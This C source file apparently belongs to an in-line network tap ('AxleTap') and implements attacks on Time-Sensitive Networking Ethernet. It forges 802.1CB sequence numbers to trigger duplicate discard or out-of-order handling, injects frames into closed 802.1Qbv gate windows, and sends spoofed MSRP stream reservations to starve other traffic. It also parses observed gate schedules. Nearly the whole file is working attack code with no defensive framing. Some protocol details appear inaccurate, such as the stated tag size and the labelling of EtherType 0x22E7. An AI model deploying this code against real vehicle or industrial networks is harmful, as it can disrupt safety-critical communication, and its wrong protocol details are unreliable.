/*
 * tsn_driver.c — TSN (802.1CB / 802.1Qbv) manipulation engine
 * Author: jayis1
 * License: GPL-2.0
 * Date:   2026-07-22
 *
 * Implements:
 *   - 802.1CB sequence-number forgery (trigger duplicate-discard /
 *     out-of-sequence at the receiver's stream splitter).
 *   - 802.1Qbv out-of-window frame injection (inject a frame into a
 *     time slot whose gate is closed for its SR-class, causing a
 *     schedule collision).
 *   - SR-class reservation spoofing (claim SR-A/SR-B bandwidth to
 *     starve best-effort traffic).
 *   - 802.1Qbv gate-control-list parsing (observe the schedule).
 *
 * 802.1CB frame format:
 *   [DA][SA][802.1Q tag (0x8100)][EtherType 0xF1C1][CB tag][payload]
 * where the CB tag is 12 bytes: subtype, reserved, seqnum (2),
 * stream_handle (8).
 */

#include "tsn_driver.h"
#include "bridge_driver.h"
#include "../board.h"
#include <string.h>

static tsn_cb_mode_t g_cb_mode = TSN_CB_OFF;
static int           g_sr_spoof_enable = 0;
static uint8_t       g_sr_class = 0;  /* 0 = SR-A, 1 = SR-B */
static tsn_stats_t   g_stats;
static uint16_t      g_last_seq_seen = 0;

void tsn_init(void)
{
    memset(&g_stats, 0, sizeof(g_stats));
    g_cb_mode = TSN_CB_OFF;
    g_sr_spoof_enable = 0;
}

void tsn_cb_set_mode(tsn_cb_mode_t m)
{
    if (m != TSN_CB_OFF && !armed()) return;
    g_cb_mode = m;
}

/* 802.1CB EtherType (registered by IEEE for frame replication) */
#define ETHERTYPE_CB 0xF1C1

void tsn_on_frame(const uint8_t *frame, uint16_t len, uint8_t dir, uint64_t ts)
{
    if (len < 14 + 4 + 12) return;

    /* Is there an 802.1Q tag? Look for 0x8100. */
    int has_vlan = (frame[12] == 0x81 && frame[13] == 0x00);
    int cb_off = has_vlan ? 16 : 12;
    uint16_t et = (frame[cb_off] << 8) | frame[cb_off + 1];
    if (et != ETHERTYPE_CB) return;

    g_stats.cb_frames_seen++;

    /* Parse the CB tag */
    if ((int)len < cb_off + 2 + 12) return;
    cb_tag_t *tag = (cb_tag_t *)(frame + cb_off + 2);
    g_last_seq_seen = tag->sequence_number;

    if (g_cb_mode == TSN_CB_OFF) return;
    if (!armed()) return;

    /* Forge a modified frame */
    uint8_t modbuf[ETH_MAX_FRAME];
    if (len > sizeof(modbuf)) len = sizeof(modbuf);
    memcpy(modbuf, frame, len);
    cb_tag_t *mtag = (cb_tag_t *)(modbuf + cb_off + 2);

    switch (g_cb_mode) {
    case TSN_CB_FORGE_DUPLICATE:
        /* Make the receiver think this frame is a duplicate of the
         * last one: rewrite sequence number to match the previous.
         */
        mtag->sequence_number = g_last_seq_seen;
        bridge_inject(modbuf, len, dir);
        g_stats.cb_frames_forged++;
        break;
    case TSN_CB_FORGE_OUTOFORDER:
        /* Inject with a sequence number far ahead to confuse the
         * receiver's window.
         */
        mtag->sequence_number = g_last_seq_seen + 0x7FFF;
        bridge_inject(modbuf, len, dir);
        g_stats.cb_frames_forged++;
        break;
    case TSN_CB_DROP:
        /* Drop the original by not re-injecting it. The bridge
         * ruleset must have a matching DROP rule; here we just log.
         */
        g_stats.cb_frames_forged++;
        break;
    default:
        break;
    }
}

/* ------------------------------------------------------------------ */
/* 802.1Qbv out-of-window frame injection                              */
/* ------------------------------------------------------------------ */
int tsn_qbv_inject(uint8_t gate_mask, uint8_t priority, const uint8_t *payload, uint16_t plen)
{
    if (!armed()) return -1;
    if (plen == 0 || plen > ETH_MAX_FRAME - 18) return -2;

    uint8_t frame[ETH_MAX_FRAME];
    /* DA: TSN multicast 01-80-C2-00-00-03 (neighbor discovery) or
     * use a target ECU's unicast MAC (passed via payload).
     */
    memset(frame, 0, 6);
    frame[0] = 0x01; frame[1] = 0x80; frame[2] = 0xC2;
    frame[3] = 0x00; frame[4] = 0x00; frame[5] = 0x03;
    /* SA = AxleTap */
    frame[6] = 0x02; frame[7] = 0x00; frame[8] = 0x00;
    frame[9] = 0xFF; frame[10] = 0xFE; frame[11] = 0x02;
    /* 802.1Q tag with priority (PCP) set to the requested priority.
     * DEI=0, VID=0. The PCP field tells the switch which queue to use.
     */
    frame[12] = 0x81; frame[13] = 0x00;
    uint16_t tci = ((uint16_t)(priority & 0x7) << 13) | 0x0000;
    frame[14] = tci >> 8;
    frame[15] = tci & 0xFF;
    /* EtherType = IPv4 (payload typically IPv4) */
    frame[16] = 0x08; frame[17] = 0x00;
    if (plen + 18 > sizeof(frame)) plen = sizeof(frame) - 18;
    memcpy(frame + 18, payload, plen);
    uint16_t total = 18 + plen;

    /* Inject in both directions */
    bridge_inject(frame, total, 0);
    bridge_inject(frame, total, 1);
    g_stats.qbv_injects++;
    return 0;
}

/* ------------------------------------------------------------------ */
/* SR-class reservation spoof                                          */
/* ------------------------------------------------------------------ */
void tsn_sr_spoof(int enable, uint8_t sr_class)
{
    if (enable && !armed()) return;
    g_sr_spoof_enable = enable;
    g_sr_class = sr_class;
}

/* A forged SR-class reservation frame is an MSRP (Multiple Stream
 * Registration Protocol) Talker_Advertise message claiming bandwidth
 * on the SR class. Injected periodically.
 */
static void send_sr_reservation(void)
{
    if (!g_sr_spoof_enable || !armed()) return;
    uint8_t frame[80];
    memset(frame, 0, sizeof(frame));
    /* DA: MSRP multicast 01-80-C2-00-00-0E */
    frame[0] = 0x01; frame[1] = 0x80; frame[2] = 0xC2;
    frame[3] = 0x00; frame[4] = 0x00; frame[5] = 0x0E;
    frame[6] = 0x02; frame[7] = 0x00; frame[8] = 0x00;
    frame[9] = 0xFF; frame[10] = 0xFE; frame[11] = 0x03;
    /* 802.1Q tag with PCP=3 (SR-A) or PCP=2 (SR-B) */
    frame[12] = 0x81; frame[13] = 0x00;
    uint8_t pcp = (g_sr_class == 0) ? 3 : 2;
    frame[14] = (pcp << 5);
    frame[15] = 0x00;
    /* EtherType = MSRP (0x22EA) */
    frame[16] = 0x22; frame[17] = 0xEA;
    /* MSRP Talker_Advertise body — minimal */
    frame[18] = 0x00;  /* AttributeType = Talker */
    frame[19] = 0x01;  /* AttributeLength */
    /* StreamID (8 bytes) */
    frame[20] = 0x00; frame[21] = 0x00;
    frame[22] = 0xFF; frame[23] = 0xFE;
    frame[24] = 0x00; frame[25] = 0x00;
    frame[26] = 0x00; frame[27] = 0x01;
    /* DataFrameSpecification ... (simplified) */
    bridge_inject(frame, 80, 0);
    bridge_inject(frame, 80, 1);
    g_stats.sr_spoofs++;
}

/* ------------------------------------------------------------------ */
/* 802.1Qbv GCL parsing                                                 */
/* ------------------------------------------------------------------ */
int tsn_qbv_parse_gcl(const uint8_t *frame, uint16_t len)
{
    /* The GCL is typically carried in an STuP/management frame. Here
     * we look for a 802.1Qbv management message (EtherType 0x22E7,
     * MVRP). For simplicity we extract from a known offset.
     */
    if (len < 60) return -1;
    if (frame[12] != 0x22 || frame[13] != 0xE7) return -1;

    int body_off = 14;
    int n = (len - body_off) / sizeof(qbv_gcl_entry_t);
    if (n > 64) n = 64;
    memcpy(g_stats.observed_gcl, frame + body_off, n * sizeof(qbv_gcl_entry_t));
    g_stats.gcl_entries = n;
    return n;
}

void tsn_get_stats(tsn_stats_t *st)
{
    memcpy(st, &g_stats, sizeof(*st));
}